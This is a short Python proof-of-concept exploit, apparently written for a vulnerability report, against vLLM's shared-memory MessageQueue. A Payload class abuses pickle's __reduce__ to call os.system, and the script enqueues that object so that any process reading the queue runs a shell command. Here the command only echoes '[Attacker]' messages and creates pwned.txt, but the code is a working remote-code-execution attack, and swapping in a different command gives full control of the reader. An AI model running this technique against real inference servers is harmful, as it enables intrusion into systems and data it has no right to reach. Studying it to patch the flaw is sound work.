import os
from vllm.distributed.device_communicators.shm_broadcast import MessageQueue

class Payload:
    def __reduce__(self):
        return (os.system, ("echo '[Attacker] Started RCE' && touch pwned.txt && echo '[Attacker] Completed RCE'",))

def main():
    # Set environment variable VLLM_PORT=29000 before running:
    #   export VLLM_PORT=29000
    mq = MessageQueue(n_reader=1, n_local_reader=0)
    mq.wait_until_ready()

    print("[Attacker] Enqueuing malicious payload ...")
    try:
        mq.enqueue(obj=Payload())
        print("[Attacker] Successfully enqueued payload.")
    except Exception:
        mq.enqueue(obj="Safe string.")
        print("[Attacker] Failed to enqueue payload.")
        

if __name__ == "__main__":
    main()
